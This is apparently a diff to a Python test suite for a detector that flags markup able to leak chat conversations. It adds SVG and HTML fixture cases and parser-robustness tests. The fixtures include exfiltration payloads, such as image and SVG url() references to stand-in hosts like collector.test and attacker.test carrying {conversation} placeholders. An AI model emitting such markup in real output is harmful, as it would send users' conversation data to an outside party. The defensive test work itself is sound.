@@ -559,6 +559,21 @@ EXFIL_IMAGE = "![status](https://collect.attacker.test/p.png?d={conversation})"
         ("<base href='https://a.test/'><link rel='preconnect' href='///{c}.collector.test'>", ["exfiltration_query"]),
         ("<base href='https://a.test/'><link rel='preconnect' href='https:{c}.collector.test'>", []),
         ("<base href='https:///{c}.collector.test/'><link rel='dns-prefetch' href='/x'>", ["exfiltration_query"]),
+        ('<svg aria-label="url(https://collector.test/{conversation}.png)"></svg>', []),
+        (
+            '<svg><rect id="url(https://collector.test/{c}.png)" class="url(x)" data-x="url(https://collector.test/{c})"/></svg>',
+            [],
+        ),
+        (
+            '<svg><path stroke="url(https://collector.test/{c}.svg#g)" marker-end="url(#m)"/></svg>',
+            ["exfiltration_query"],
+        ),
+        ('<svg><g clip-path="url(https://collector.test/{c}.svg#c)" mask="url(#m)"/></svg>', ["exfiltration_query"]),
+        (
+            "<script><!--<script></script><template></script><img src='https://collector.test/{c}.png'>",
+            ["uncheckable_markup"],
+        ),
+        ("<script><!-- a < b --></script><img src='https://a.test/a.png'>", []),
         ('<div style="color:red;margin:0">x</div>', []),
         ("<style>.a{color:red;font-family:'Inter'}</style>", []),
         ("<template><style>.a{background:url(https://collector.test/{c}.png)}</style></template>", []),
@@ -677,6 +692,26 @@ def test_repeated_reference_destinations_are_bounded_before_rendering(
 def test_a_few_uses_of_a_reference_are_parsed() -> None:
     text = " ".join(["![x][x]"] * 50) + "\n\n[x]: https://collector.test/{conversation}.png"
     assert set(exfiltration_link_classes(text)) == {"exfiltration_query"}
+
+
+@pytest.mark.parametrize(
+    "reference",
+    ["&#" + "9" * 5000 + ";", "&#x" + "f" * 5000 + ";", "&#" + "0" * 5000 + "65;", "&#" + "9" * 5000],
+    ids=["decimal", "hex", "leading-zeros", "no-semicolon"],
+)
+def test_long_numeric_character_references_do_not_raise(reference: str) -> None:
+    assert exfiltration_link_classes(f'<div title="{reference}">x</div>') == []
+    assert exfiltration_link_classes(f"<img src='https://collector.test/{{c}}.png' alt='{reference}'>") == [
+        "exfiltration_query"
+    ]
+
+
+def test_parser_errors_fail_closed(monkeypatch: pytest.MonkeyPatch) -> None:
+    def reject(self: Any, data: str) -> None:
+        raise ValueError("malformed")
+
+    monkeypatch.setattr(catalog_security._HtmlUrls, "feed", reject)
+    assert exfiltration_link_classes("<div>x</div>") == ["uncheckable_markup"]
 
 
 def test_oversized_text_without_markup_passes() -> None:
